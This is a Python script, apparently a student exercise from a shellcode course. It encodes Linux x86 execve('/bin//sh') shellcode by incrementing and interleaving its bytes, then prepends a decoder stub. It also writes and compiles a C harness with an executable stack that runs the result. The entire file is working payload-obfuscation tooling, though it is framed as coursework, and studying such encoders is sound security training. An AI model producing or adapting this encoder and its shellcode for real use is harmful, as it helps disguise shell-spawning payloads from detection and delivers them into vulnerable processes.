#!/usr/bin/python

# Filename: genEncodedShellCode.py
# Author: Jonathan So
# Student ID: SLAE-1470
# SLAE-Exercise 4

import os

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encodedP2 = ""
encoded2 = ""
encoded2P2 = ""
count = 1

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	x += 1
	if count % 2 != 0:
		encoded += '\\x'
		encoded += '%02x' % x
	else:
		encodedP2 += '\\x'
		encodedP2 += '%02x' % x
	count += 1

encoded =  encoded + encodedP2
half = str(hex(count/2))[2::]
if len(half) < 2:
	half = '0'+half

Shellcode = "\\xeb\\x22\\x5e\\x8d\\x7e"
Shellcode +="\\x" + half
Shellcode +="\\x31\\xdb\\x31\\xc9\\xf7\\xe1\\x89\\xe2\\xb1"
Shellcode +="\\x" + half
Shellcode +="\\x8a\\x1e\\x4b\\x88\\x1c\\x02\\x40\\x8a\\x1f"
Shellcode +="\\x4b\\x88\\x1c\\x02\\x40\\x46\\x47\\xe2\\xee"
Shellcode +="\\xff\\xe2\\xe8\\xd9\\xff\\xff\\xff"
Shellcode +=encoded

print("Shellcode:")
print Shellcode

filename="decoder.c"
print("Saving to " + filename)

content = "#include<stdio.h>\n"
content += "#include<string.h>\n"
content += "unsigned char code[] = \\\n"
content += "\"" + Shellcode + "\";\n"
content += "int main(){\n"
content += "	printf(\"Shellcode Length:  %d\\n\", strlen(code));\n"
content += "	int (*ret)() = (int(*)())code;\n"
content += "	ret();}\n"

textfile = open(filename , 'w')
textfile.write(content)
textfile.close()

os.system("gcc -m32 -fno-stack-protector -z execstack " + filename +" -o " + filename[:-2])
